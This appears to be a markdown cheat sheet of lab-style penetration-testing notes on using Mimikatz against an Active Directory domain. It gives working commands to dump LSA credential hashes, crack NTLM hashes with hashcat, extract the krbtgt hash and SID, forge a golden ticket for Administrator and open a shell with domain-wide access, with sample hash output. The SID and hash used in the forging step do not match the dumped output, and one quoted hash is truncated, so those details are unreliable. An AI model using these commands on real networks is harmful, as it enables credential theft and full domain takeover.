## Mimikatz
### Tables of Contents
- [Mimikatz](#mimikatz)
  * [Tables of Contents](#tables-of-contents)
  * [Run](#run)
  * [Dump hashes](#dump-hashes)
  * [Crack with hashcat](#crack-with-hashcat)
  * [Golden Ticket](#golden-ticket)
  * [Create the Golden Ticket](#create-the-golden-ticket)
  * [Use the Ticket](#use-the-ticket)

- Mimikatz is a very popular and powerful post-exploitation tool mainly used for dumping user credentials inside of a active directory network
- Transfer mimikatz.exe to the target
### Run
````
./mimikatz.exe
````
- Ensure that the output is "Privilege '20' ok" - This ensures that you're running mimikatz as an administrator.
- If you don't run mimikatz as an administrator, mimikatz will not run properly
````
privilege::debug 
````
### Dump hashes
````
lsadump::lsa /patch
````
### Crack with hashcat
````
hashcat -m 1000 <hash> rockyou.txt
````
### Golden Ticket
- Again using the mimikatz as the previous task; however, this time we'll be using it to create a golden ticket.
- We will first dump the hash and sid of the krbtgt user then create a golden ticket and use that golden ticket to open up a new command prompt allowing us to access any machine on the network.
- This dumps the hash and security identifier of the Kerberos Ticket Granting Ticket account allowing you to create a golden ticket
````
lsadump::lsa /inject /name:krbtgt
````
- Output should look like this:
````
mimikatz # lsadump::lsa /inject /name:krbtgt 
Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166 

RID  : 000001f6 (502)
User : krbtgt

 * Primary
    NTLM : 5508500012cc005cf7082a9a89ebdfdf 
    LM   :
  Hash NTLM: 5508500012cc005cf7082a9a89ebdfdf
    ntlm- 0: 5508500012cc005cf7082a9a89ebdfdf
    lm  - 0: 372f405db05d3cafd27f8e6a4a097b2c

 * WDigest
    01  49a8de3b6c7ae1ddf36aa868e68cd9ea
    02  7902703149b131c57e5253fd9ea710d0
    03  71288a6388fb28088a434d3705cc6f2a
    04  49a8de3b6c7ae1ddf36aa868e68cd9ea
    05  7902703149b131c57e5253fd9ea710d0
    06  df5ad3cc1ff643663d85dabc81432a81
    07  49a8de3b6c7ae1ddf36aa868e68cd9ea
    08  a489809bd0f8e525f450fac01ea2054b
    09  19e54fd00868c3b0b35b5e0926934c99
    10  4462ea84c5537142029ea1b354cd25fa
    11  6773fcbf03fd29e51720f2c5087cb81c
    12  19e54fd00868c3b0b35b5e0926934c99
    13  52902abbeec1f1d3b46a7bd5adab3b57
    14  6773fcbf03fd29e51720f2c5087cb81c
    15  8f2593c344922717d05d537487a1336d
    16  49c009813995b032cc1f1a181eaadee4
    17  8552f561e937ad7c13a0dca4e9b0b25a
    18  cc18f1d9a1f4d28b58a063f69fa54f27 
    19  12ae8a0629634a31aa63d6f422a14953
    20  b6392b0471c53dd2379dcc570816ba10
    21  7ab113cb39aa4be369710f6926b68094
    22  7ab113cb39aa4be369710f6926b68094
    23  e38f8bc728b21b85602231dba189c5be
    24  4700657dde6382cd7b990fb042b00f9e
    25  8f46d9db219cbd64fb61ba4fdb1c9ba7
    26  36b6a21f031bf361ce38d4d8ad39ee0f
    27  e69385ee50f9d3e105f50c61c53e718e
    28  ca006400aefe845da46b137b5b50f371
    29  15a607251e3a2973a843e09c008c32e3 

 * Kerberos
    Default Salt : CONTROLLER.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 64ef5d43922f3b5d

 * Kerberos-Newer-Keys
    Default Salt : CONTROLLER.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 8e544cabf340db750cef9f5db7e1a2f97e465dffbd5a2dc64246bda3c75fe53d
      aes128_hmac       (4096) : 7eb35bddd529c0614e5ad9db4c798066
      des_cbc_md5       (4096) : 64ef5d43922f3b5d

 * NTLM-Strong-NTOWF
    Random Value : 666caaaaf30081f30211bd7fa445fec4 
````
### Create the Golden Ticket
- You will need the:
- Domain SID (S-1-5-21-849420856-2351964222-986696166)
- USER (krbtgt)
- NTLM (5508500012cc005cf7082a9a89ebdfd)
- Create a Golden Ticket
````
kerberos::golden /user: /domain: /sid: /krbtgt: /id:
````
- To create a golden ticket based on the output above we would use:
````
Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-3893474861-143125734-211
2006029 /krbtgt:78558f004296a6f9438f4532164a7acd /id:500
````
- Output should look like this:
````
User      : Administrator 
Domain    : controller.local (CONTROLLER)
SID       : S-1-5-21-3893474861-143125734-2112006029
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 78558f004296a6f9438f4532164a7acd - rc4_hmac_nt
Lifetime  : 8/8/2021 4:37:58 PM ; 8/6/2031 4:37:58 PM ; 8/6/2031 4:37:58 PM
-> Ticket : ticket.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !
````
### Use the Ticket
- Use the Golden Ticket to access other machines:
````
misc::cmd
````
- This will open a new command prompt with elevated privlages to all machines
- Access other Machines! - You will now have another command prompt with access to all other machines on the network







